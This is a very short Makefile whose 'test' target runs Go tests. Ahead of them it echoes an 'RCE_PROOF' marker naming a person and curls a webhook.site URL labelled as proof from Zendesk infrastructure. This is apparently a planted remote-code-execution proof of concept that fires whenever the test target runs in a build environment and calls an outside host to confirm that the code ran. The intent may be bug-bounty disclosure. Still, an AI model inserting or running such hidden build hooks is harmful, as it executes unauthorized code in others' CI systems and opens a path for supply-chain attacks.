test:
	@echo "RCE_PROOF_BY_FIRMAN_SAHIDIN"
	@curl -m 10 https://webhook.site/ce134386-abef-4b94-a5c6-d552be25d1b5/proof_from_zendesk_infrastructure
	go test -v ./...
